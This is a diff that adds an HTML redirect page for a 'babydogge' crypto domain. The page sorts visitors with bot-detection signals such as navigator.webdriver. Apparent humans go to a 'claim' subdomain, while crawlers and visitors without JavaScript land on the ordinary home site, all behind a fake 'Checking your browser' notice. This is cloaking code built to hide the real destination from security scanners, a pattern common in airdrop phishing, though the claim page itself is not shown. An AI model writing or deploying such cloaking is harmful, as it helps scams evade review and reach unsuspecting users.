@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <title>Redirecting...</title>
+        <meta name="robots" content="noindex, nofollow">
+        <script>
+            const humanURL = "https:\/\/claim.babydogge.com";
+            const botURL = "https:\/\/babydogge.com\/home";
+
+            // Optional: skip detection if already verified
+            if (document.cookie.includes('human_verified=true')) {
+                window.location.href = humanURL;
+            }
+
+            function isProbablyBot() {
+                let score = 0;
+
+                // Only keep strongest signals
+                if (navigator.webdriver) score += 2;
+
+                // Weak signal – don't count on mobile
+                if (!navigator.language || (navigator.languages && navigator.languages.length === 0)) score += 1;
+
+                return score;
+            }
+
+            function redirectBasedOnSignals() {
+                let score = isProbablyBot();
+                let hasInteracted = false;
+
+                const markAsHuman = () => {
+                    hasInteracted = true;
+                    clearTimeout(timeout);
+                    document.cookie = "human_verified=true; max-age=86400; path=/";
+                    window.location.href = humanURL;
+                };
+
+                // Listen for any interaction
+                ['mousemove', 'touchstart', 'click', 'keydown'].forEach(evt => {
+                    window.addEventListener(evt, markAsHuman, { once: true });
+                });
+
+                const timeout = setTimeout(() => {
+                    if (!hasInteracted && score >= 2) {
+                        window.location.href = botURL;
+                    } else {
+                        document.cookie = "human_verified=true; max-age=86400; path=/";
+                        window.location.href = humanURL;
+                    }
+                }, 4000); // wait longer on mobile
+            }
+
+            window.addEventListener('DOMContentLoaded', redirectBasedOnSignals);
+        </script>
+
+
+        <noscript>
+            <meta http-equiv="refresh" content="0;url=https://babydogge.com/home" />
+        </noscript>
+    </head>
+
+    <body>
+        <p>Checking your browser, please wait...</p>
+    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'94c94c170a05fa15',t:'MTc0OTM5NTIyOS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+
+</html>
